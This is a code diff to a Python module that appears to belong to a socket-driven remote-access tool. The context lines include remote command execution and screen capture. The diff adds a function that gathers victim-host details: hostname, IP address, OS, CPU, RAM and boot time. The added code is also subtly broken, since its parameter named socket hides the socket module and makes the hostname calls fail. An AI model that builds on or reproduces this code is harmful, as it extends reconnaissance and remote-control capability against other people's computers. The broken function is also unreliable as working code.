@@ -1,9 +1,10 @@
 from socket_handlers import *
 from urllib.parse import unquote
-import os, base64, binascii, requests, ctypes, subprocess
+import os, base64, binascii, requests, ctypes, subprocess, psutil, json, platform
 from pathvalidate import sanitize_filename, sanitize_filepath
 from typing import Tuple
 from mss import mss
+from datetime import datetime
 
 
 def pwd(socket):
@@ -660,3 +661,30 @@ def execute_system_command(socket, command: str, timeout: int = 30) -> bool:
     except Exception as e:
         socket_send(socket, f"[!] Unexpected error: {str(e)}")
         return False
+
+
+def get_system_info(socket):
+    try:
+        system_info = {
+            "platform": platform.system(),
+            "platform_version": platform.version(),
+            "architecture": platform.machine(),
+            "hostname": socket.gethostname(),
+            "ip_address": socket.gethostbyname(socket.gethostname()),
+            "processor": platform.processor(),
+            "physical_cores": psutil.cpu_count(logical=False),
+            "total_cores": psutil.cpu_count(logical=True),
+            "cpu_usage": psutil.cpu_percent(interval=1),
+            "total_ram": round(psutil.virtual_memory().total / (1024.0**3), 2),  # GB
+            "available_ram": round(
+                psutil.virtual_memory().available / (1024.0**3), 2
+            ),  # GB
+            "ram_usage": psutil.virtual_memory().percent,
+            "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime(
+                "%Y-%m-%d %H:%M:%S"
+            ),
+            "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        }
+        return system_info
+    except Exception as e:
+        return {"error": f"Failed to gather system info: {str(e)}"}
